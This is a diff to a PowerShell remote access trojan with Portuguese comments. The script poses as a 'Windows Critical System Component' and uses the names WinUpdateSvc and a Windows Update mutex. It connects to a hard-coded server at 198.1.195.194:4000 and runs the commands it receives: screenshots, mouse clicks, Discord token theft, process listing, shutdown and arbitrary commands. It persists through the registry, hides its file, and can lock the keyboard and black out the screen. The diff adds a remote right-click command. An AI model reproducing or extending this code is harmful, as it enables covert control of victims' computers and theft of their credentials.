@@ -1,4 +1,4 @@
-<#
+=<#
 .SYNOPSIS
 Windows Critical System Component
 .DESCRIPTION
@@ -8,7 +8,7 @@ Version: 10.0.19045.1
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
+$serverIP = "198.1.195.194"  # ⚠️ MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -56,7 +56,9 @@ $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
 New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
 
 # Copiar script
-Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force -ErrorAction SilentlyContinue
+if ($MyInvocation.MyCommand.Path -ne $scriptPath) {
+    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force -ErrorAction SilentlyContinue
+}
 
 # Registry (Startup)
 try {
@@ -65,6 +67,7 @@ try {
 } catch {}
 
 # Ocultar arquivo
+Start-Sleep -Milliseconds 500
 attrib +h +s +r $scriptPath 2>$null
 
 # ===== FUNÇÕES BASICAS =====
@@ -209,6 +212,22 @@ public static extern void mouse_event(long dwFlags, long dx, long dy, long cButt
     }
 }
 
+function Click-RightMouse {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        $signature = @'
+[DllImport("user32.dll",CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
+public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
+'@
+        $SendMouseClick = Add-Type -memberDefinition $signature -name "Win32MouseEventRight" -namespace Win32Functions -passThru
+        $SendMouseClick::mouse_event(0x00000008, 0, 0, 0, 0)
+        $SendMouseClick::mouse_event(0x00000010, 0, 0, 0, 0)
+        return "OK"
+    } catch {
+        return "RIGHTCLICK_ERROR: $_"
+    }
+}
+
 # ===== TECLADO =====
 $keyboardLockScript = $null
 
@@ -255,7 +274,6 @@ function Enable-BlackScreen {
         $global:blackScreenForm.KeyPreview = $true
         $global:blackScreenForm.Add_KeyDown({ $_.SuppressKeyPress = $true })
         
-        # Executar em thread separada
         $rs = [runspacefactory]::CreateRunspace()
         $rs.ApartmentState = "STA"
         $rs.ThreadOptions = "ReuseThread"
@@ -407,7 +425,7 @@ function Execute-Command {
         if ([string]::IsNullOrWhiteSpace($result)) { $result = "Comando executado (sem saída)" }
         return $result
     } catch {
-        return "ERRO: $_"
+        return "Erro: $_"
     }
 }
 
@@ -503,6 +521,7 @@ while ($true) {
                 "test" { $writer.WriteLine("PONG") }
                 "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
                 "click" { $writer.WriteLine((Click-Mouse)) }
+                "rightclick" { $writer.WriteLine((Click-RightMouse)) }
                 "discord" { $writer.WriteLine((Get-DiscordToken)) }
                 "processes" { $writer.WriteLine((Get-ProcessList)) }
                 "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
